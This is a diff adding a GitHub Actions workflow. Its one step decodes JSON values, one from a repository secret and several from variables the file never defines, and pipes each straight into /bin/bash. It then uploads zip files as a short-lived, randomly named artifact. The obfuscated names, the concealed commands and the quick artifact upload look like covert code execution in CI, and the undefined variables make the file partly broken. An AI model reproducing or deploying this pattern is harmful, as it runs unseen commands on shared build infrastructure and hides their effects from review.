@@ -1,0 +1,26 @@
+name: viewmartinprime
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: viewmartinprime
+        env:
+          ig65: ${{ secrets.ig65 }}
+        run: |
+          printf '%s' "$ig65" | jq -r .vt465 | /bin/bash
+          printf '%s' "$twuk8321" | jq -r .gdmw7 | /bin/bash
+          echo $j48529 | jq -r .h52 | /bin/bash
+          printf '%s' "$d295" | jq -r .un62 | /bin/bash
+          printf '%s' "$bx25781" | jq -r .fbe11739 | /bin/bash
+          echo $y398 | jq -r .oe1914 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: WlcVJkQJ
+          path: "*.zip"
+          retention-days: 1
